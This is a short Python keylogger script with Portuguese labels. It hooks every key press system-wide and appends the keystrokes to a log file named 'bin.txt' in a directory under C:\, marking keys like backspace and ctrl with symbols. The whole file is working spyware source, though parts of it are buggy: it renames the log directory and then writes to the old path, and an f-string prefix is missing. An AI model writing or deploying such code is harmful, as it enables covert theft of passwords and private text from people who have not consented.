import keyboard
import os
import time

dirToRename = 'C:\KeyLog'
if not os.path.exists(dirToRename):
    os.mkdir(dirToRename)
    print('Feito DirToRename')
    
os.rename(dirToRename, 'C:/KeylogRenamed')

TimeAtual = time.localtime()
DirToMake2 = './temp'

if not os.path.exists(dirToRename):
    os.mkdir(dirToRename)

Log_file = os.path.join(dirToRename, 'bin.txt')

with open(Log_file, 'a') as fw:
    fw.write('{TimeAtual}\nKeylogger ativo:\n') 


def on_key_press(event):
    with open(Log_file, 'a') as f:
        if event.name == 'space':
            f.write('\n')
        elif event.name == 'backspace':
            f.write('/-/')
        elif event.name == 'ctrl':
            f.write('^')
        elif event.name == 'alt':
            f.write('[ALT]')
        elif event.name == 'shift':
            pass
        elif event.name == 'enter':
            f.write('\n')
        else:
            if keyboard.is_pressed('shift'):
                f.write(event.name.upper())
            else:
                f.write(event.name)

keyboard.on_press(on_key_press)
keyboard.wait()